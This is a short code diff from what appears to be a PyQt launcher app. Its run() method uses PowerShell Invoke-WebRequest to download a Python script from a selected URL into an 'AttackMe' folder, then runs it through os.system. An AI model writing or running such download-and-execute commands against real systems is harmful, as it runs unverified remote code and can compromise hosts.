@@ -140,10 +140,11 @@ class MyWindow(QMainWindow):
     def run(self):
         for i in self.url_comboList.keys():
             if self.url_combo.currentText() == i:
-                cmd = 'powershell.exe -command "invoke-WebRequest {} -Outfile C:\AttackMe\download\M2_v1.0.py"; start cmd /k python "C:\AttackMe\download\M2_v1.0.py'.format(
+                cmd1 = 'powershell.exe -command "invoke-WebRequest {} -Outfile C:\AttackMe\download\M2_v1.0.py";'.format(
                     self.url_comboList[i])
-                print(cmd)
-                os.system(cmd)
+                cmd2 = 'start cmd /k python "C:\AttackMe\download\M2_v1.0.py"'
+                os.system(cmd1)
+                os.system(cmd2)
 
     # CSV 이벤트
     def csvSave(self):
